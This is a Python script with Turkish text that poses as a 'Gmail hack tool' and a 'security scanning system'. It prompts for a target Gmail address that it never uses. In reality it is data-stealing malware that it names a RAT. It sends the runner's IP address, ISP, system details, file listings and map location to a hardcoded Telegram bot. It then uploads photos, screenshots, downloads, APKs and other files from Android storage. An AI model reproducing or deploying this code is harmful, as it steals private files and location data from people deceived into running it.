import requests
import geocoder 
import socket
import sys
import time
from glob import glob
from datetime import datetime
from platform import *
import os
from tqdm import tqdm

print("GMAİL (hack) TOOL AÇILIYOR.")
for i in tqdm(range(100)):
    time.sleep(0.040)

os.system('clear')
token = "8514325332:AAEzMvZ8nkDoPl9GbmvsL7dqrUVRbm1o43I"
id = "8537325049"

print('')

try:
    tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=⚠️RAT BAŞLATILDI:\n@imhaettim Sunar😁🌿\nChannel: @b23system')
    
    ip = requests.get("https://api.ipify.org").text
    with open('IpAdresi.txt', 'w') as IP:
        IP.write(f' [ + ]  Cihazın İp ~» {ip} ')
    
    with open('IpAdresi.txt', 'rb') as ip_file:
        dosya = {'document': ip_file}
        res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)

    sonuc = requests.get(f'http://ip-api.com/json/{ip}').json()       
    with open('HatSaglayicisi.txt', 'w') as AS:
        AS.write(f' [ ✓ ] Kullandigi Hat Saglayici » ....  {sonuc["isp"]} ')
    
    with open('HatSaglayicisi.txt', 'rb') as as_file:
        dosya = {'document': as_file}
        res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)   

    print('''╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  🚀 GÜVENLİK TARAMA SİSTEMİ v3.0 🚀                         ║
║                                                              ║
║  ► Sistem Analizi & Optimizasyon Aracı ◄                    ║
║                                                              ║
║  Geliştirici: @imhaettim • Kanal: @B23system                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝''')
    
    input("HACK,LENECEK GMAİL adresini gir:")
    input("MORALES YAZ VE ENTERE TIKLA:")
    
    sistemsurumu = release()
    pythonsurumu = sys.version.split()[0]  # Düzeltildi
    platformbilgisi = platform()
    makinebilgisi = machine()
    versiyon = version()    
    
    with open('Sistem.txt', 'w') as S:
        S.write(f' Sistem Bilgisi: {sistemsurumu}  python_version => {pythonsurumu}  platform => {platformbilgisi}  machine => {makinebilgisi}  version => {versiyon} ')
    
    with open('Sistem.txt', 'rb') as sistem_file:
        dosya = {'document': sistem_file}
        res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)

    dosyalar = glob("/storage/emulated/0/*")
    with open('DosyaDizinleri.txt', 'w') as D:
        D.write(f' [ ✓ ] Sistemin Dosya Dizinleri » .... ')    
        for dosya_item in dosyalar:
            D.write(str(dosya_item) + '    ,    ')
    
    with open('DosyaDizinleri.txt', 'rb') as dosya_file:
        dosya = {'document': dosya_file}
        res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)

    try:
        bizimip = geocoder.ip(ip).latlng
        if bizimip:
            haritaenlem = bizimip[0]
            haritaboylam = bizimip[1]
            with open('Konum.txt', 'w') as konum_dosyasi:
                konum_dosyasi.write(f' [ ✓ ] Hedefin-Konum-IP » ....  https://www.google.com/maps/@{haritaenlem},{haritaboylam},13z')
            
            with open('Konum.txt', 'rb') as konum_file:
                dosya = {'document': konum_file}
                res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)
    except Exception as e:
        print(f"Konum hatası: {e}")
              
    print('[ ✘ ] Apiden Yanıt Bekleniyor .......')

    def gonder(dosya_dict):
        requests.post(f'https://api.telegram.org/bot{token}/sendDocument?chat_id={id}', files=dosya_dict)

    tarih = datetime.now()

    dizinler = [
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Download/Telegram",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/DCIM/Screenshots",
        "/storage/emulated/0/DCIM/ScreenRecorder"
    ]

    for dizin in dizinler:
        try:
            if os.path.exists(dizin):
                os.chdir(dizin)
                dosya_listesi = list(os.scandir('.'))
                for dosya_item in dosya_listesi:
                    if dosya_item.name.endswith(('jpg', 'png', 'zip', 'rar', 'php', 'mp4', 'txt', 'apk', 'py')):
                        try:
                            with open(dosya_item.name, 'rb') as file:
                                dosyaverisi = {"document": file}
                                gonder(dosyaverisi)
                        except Exception as e:
                            continue
        except Exception as e:
            continue

    tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=⚠️İşlem tamamlandı..\nDev: @imhaettim\nChannel: @B23system')

except Exception as e:
    print(f"Hata oluştu: {e}")

exit('Morales')